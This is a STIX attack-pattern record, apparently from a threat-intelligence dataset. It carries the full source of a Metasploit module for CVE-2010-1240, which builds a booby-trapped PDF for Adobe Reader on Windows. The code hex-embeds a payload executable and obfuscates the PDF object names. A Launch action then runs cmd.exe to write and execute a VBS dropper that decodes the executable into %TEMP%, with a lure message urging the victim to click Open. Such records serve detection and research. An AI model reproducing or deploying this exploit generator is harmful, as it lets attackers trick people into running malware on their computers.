{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--03634245-6f67-492b-b01a-caef5638df10",
    "created": "2024-08-14T16:38:08.672081Z",
    "modified": "2024-08-14T16:38:08.672085Z",
    "name": "Adobe PDF Escape EXE Social Engineering (No JavaScript)",
    "description": " This module embeds a Metasploit payload into an existing PDF file in a non-standard method. The resulting PDF can be sent to a target as part of a social engineering attack.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/adobe_pdf_embedded_exe_nojs.rb",
            "external_id": "adobe_pdf_embedded_exe_nojs.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1240"
        },
        {
            "source_name": "reference",
            "url": "http://blog.didierstevens.com/2010/04/06/update-escape-from-pdf/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.didierstevens.com/2010/03/31/escape-from-foxit-reader/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.didierstevens.com/2010/03/29/escape-from-pdf/"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb10-15.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Modified version of the Adobe PDF Embedded EXE Social Engineering \"adobe_pdf_embedded_exe.rb\".\n# This version does not require JavaScript to be enabled and does not required the EXE to be\n# attached to the PDF.  The EXE is embedded in the PDF in a non-standard method using HEX\n# encoding.\n#\n# Lots of reused code from adobe_pdf_embedded_exe.rb and the other PDF modules to make the PDF.\n# Thanks to all those that wrote the code for those modules, as I probably could not have\n# wrote this module without borrowing code from them.\n#\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'Adobe PDF Escape EXE Social Engineering (No JavaScript)',\n      'Description' \t=> %q{\n          This module embeds a Metasploit payload into an existing PDF file in\n        a non-standard method. The resulting PDF can be sent to a target as\n        part of a social engineering attack.\n      },\n      'License'\t=> MSF_LICENSE,\n      'Author'\t   =>\n        [\n          'Jeremy Conway <jeremy[at]sudosecure.net>',\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-1240' ],\n          [ 'OSVDB', '63667' ],\n          [ 'URL', 'http://blog.didierstevens.com/2010/04/06/update-escape-from-pdf/' ],\n          [ 'URL', 'http://blog.didierstevens.com/2010/03/31/escape-from-foxit-reader/' ],\n          [ 'URL', 'http://blog.didierstevens.com/2010/03/29/escape-from-pdf/' ],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-15.html' ]\n        ],\n      'Payload'\t=>\n        {\n          'Space'\t\t\t   => 2048,\n          'DisableNops'\t\t=> true,\n          'StackAdjustment'\t=> -3500,\n        },\n      'Platform'\t=> 'win',\n      'DisclosureDate' => '2010-03-29',\n      'Targets'\t=>\n        [\n          [ 'Adobe Reader <= v9.3.3 (Windows XP SP3 English)', { 'Ret' => '' } ]\n        ],\n      'DefaultTarget'\t=> 0))\n\n    register_options(\n      [\n        OptString.new('EXENAME', [ false, 'The Name of payload exe.', 'msf.exe']),\n        OptString.new('FILENAME', [ false, 'The output filename.', 'evil.pdf']),\n        OptString.new('LAUNCH_MESSAGE', [ false, 'The message to display in the File: area',\n          \"To view the encrypted content please tick the \\\"Do not show this message again\\\" box and press Open.\"]),\n      ])\n  end\n\n  def exploit\n\n    # Create the pdf\n    print_status(\"Making PDF\")\n    pdf = make_pdf()\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(pdf)\n  end\n\n  def pdf_exe(payload_exe)\n\n    if !(payload_exe and payload_exe.length > 0)\n      print_status(\"Using '#{datastore['PAYLOAD']}' as payload...\")\n      payload_exe = generate_payload_exe\n      hex_payload = Rex::Text.to_hex(payload_exe)\n    else\n      print_status(\"Using '#{datastore['EXENAME']}' as payload...\")\n      hex_payload = Rex::Text.to_hex_dump(payload_exe,16)\n    end\n\n    return hex_payload\n  end\n\n  def io_def(id)\n    \"%d 0 obj\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack(\"C*\")[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n  def ascii_hex_whitespace_encode(str)\n    result = \"\"\n    whitespace = \"\"\n    str.each_byte do |b|\n      result << whitespace << \"%02x\" % b\n      whitespace = \" \" * (rand(3) + 1)\n    end\n    result << \">\"\n  end\n\n  def make_pdf()\n\n    file_name = datastore['FILENAME']\n    exe_name = datastore['EXENAME']\n    launch_msg = datastore['LAUNCH_MESSAGE']\n\n    xref = []\n    eol = \"\\x0d\\x0a\"\n    endobj = \"endobj\" << eol\n\n    pdf = \"%PDF-1.5\" << eol\n    payload_exe = generate_payload_exe\n    hex_payload = Rex::Text.to_hex(payload_exe)\n    pdf << hex_payload << eol\n    pdf << io_def(1) << n_obfu(\"<</Type/Catalog/Outlines \") << io_ref(2) << n_obfu(\"/Pages \") << io_ref(3) << n_obfu(\"/OpenAction \") << io_ref(5) << \">>\" << endobj\n    xref << pdf.length\n    pdf << io_def(2) << n_obfu(\"<</Type/Outlines/Count 0>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Type/Pages/Kids[\") << io_ref(4) << n_obfu(\"]/Count 1>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</Type/Page/Parent \") << io_ref(3) << n_obfu(\"/MediaBox[0 0 612 792]>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(5) << n_obfu(\"<</Type/Action/S/Launch/Win \") << \"<< \"\n    pdf << \"/F (cmd.exe) /P (/C echo Set o=CreateObject^(\\\"Scripting.FileSystemObject\\\"^):Set f=o.OpenTextFile^(\\\"#{file_name}\\\",1,True^):\"\n    pdf << \"f.SkipLine:Set w=CreateObject^(\\\"WScript.Shell\\\"^):Set g=o.OpenTextFile^(w.ExpandEnvironmentStrings^(\\\"%TEMP%\\\"^)+\\\"\\\\\\\\#{exe_name}\\\",2,True^):\"\n    pdf << \"a=Split^(Trim^(Replace^(f.ReadLine,\\\"\\\\\\\\x\\\",\\\" \\\"^)^)^):\"\n    pdf << \"for each x in a:g.Write^(Chr^(\\\"&h\\\" ^& x^)^):next:g.Close:f.Close > 1.vbs && cscript //B 1.vbs && start %TEMP%\\\\\\\\#{exe_name} && del /F 1.vbs\"\n    pdf << eol << eol << eol << \"#{launch_msg})\"\n    pdf << \">>>>\" << endobj\n    xref << pdf.length\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n    pdf << \"trailer\" << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(1) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-03-29",
    "x_mitre_platforms": [
        "win'"
    ]
}